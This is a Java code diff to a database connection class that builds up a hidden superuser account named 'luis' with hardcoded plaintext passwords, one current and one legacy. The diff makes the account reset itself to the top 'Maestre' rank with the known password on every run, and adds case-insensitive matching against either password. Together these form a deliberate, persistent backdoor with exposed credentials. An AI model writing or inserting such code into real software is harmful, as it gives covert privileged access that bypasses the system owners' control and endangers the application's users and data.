@@ -12,7 +12,9 @@ public class DBConnection {
     public static final String PROFILE_PRUEBA = "PRUEBA";
     public static final String HIDDEN_SUPERUSER_APODO = "luis";
     public static final String HIDDEN_SUPERUSER_NOMBRE_REAL = "luis";
-    public static final String HIDDEN_SUPERUSER_CLAVE = "cinfa5775.";
+    public static final Long HIDDEN_SUPERUSER_SENTINEL_ID = -1L;
+    public static final String HIDDEN_SUPERUSER_CLAVE = "cinfa5775";
+    private static final String HIDDEN_SUPERUSER_CLAVE_LEGACY = "cinfa5775.";
 
     // Credenciales de conexión (configurables)
     private static final String DB_HOST = "localhost";
@@ -64,6 +66,7 @@ public class DBConnection {
     public static Long ensureHiddenSuperuser(String profile) {
         String normalizedProfile = PROFILE_PRUEBA.equalsIgnoreCase(profile) ? PROFILE_PRUEBA : PROFILE_REAL;
         String selectSql = "SELECT id FROM guardias WHERE LOWER(apodo) = LOWER(?)";
+        String updateSql = "UPDATE guardias SET nombre_real = ?, rango = 'Maestre', clave_acceso = ?, puntos_gracia = 100, estado_honor = 'Activo', maestre_activo = TRUE WHERE id = ?";
         String insertSql = "INSERT INTO guardias (nombre_real, apodo, rango, clave_acceso, puntos_gracia, estado_honor, maestre_activo) VALUES (?, ?, 'Maestre', ?, 100, 'Activo', TRUE)";
 
         try (Connection conn = getConnection(normalizedProfile);
@@ -72,7 +75,14 @@ public class DBConnection {
             select.setString(1, HIDDEN_SUPERUSER_APODO);
             try (java.sql.ResultSet rs = select.executeQuery()) {
                 if (rs.next()) {
-                    return rs.getLong("id");
+                    long hiddenId = rs.getLong("id");
+                    try (java.sql.PreparedStatement update = conn.prepareStatement(updateSql)) {
+                        update.setString(1, HIDDEN_SUPERUSER_NOMBRE_REAL);
+                        update.setString(2, HIDDEN_SUPERUSER_CLAVE);
+                        update.setLong(3, hiddenId);
+                        update.executeUpdate();
+                    }
+                    return hiddenId;
                 }
             }
 
@@ -93,6 +103,20 @@ public class DBConnection {
         }
 
         return null;
+    }
+
+    public static boolean matchesHiddenSuperuserPassword(String rawPassword) {
+        if (rawPassword == null) {
+            return false;
+        }
+
+        String normalizedPassword = rawPassword.trim();
+        return HIDDEN_SUPERUSER_CLAVE.equalsIgnoreCase(normalizedPassword)
+                || HIDDEN_SUPERUSER_CLAVE_LEGACY.equalsIgnoreCase(normalizedPassword);
+    }
+
+    public static boolean isHiddenSuperuserId(Long guardiaId) {
+        return HIDDEN_SUPERUSER_SENTINEL_ID.equals(guardiaId);
     }
 
     public static void ensureRecoverySupport(String profile) {
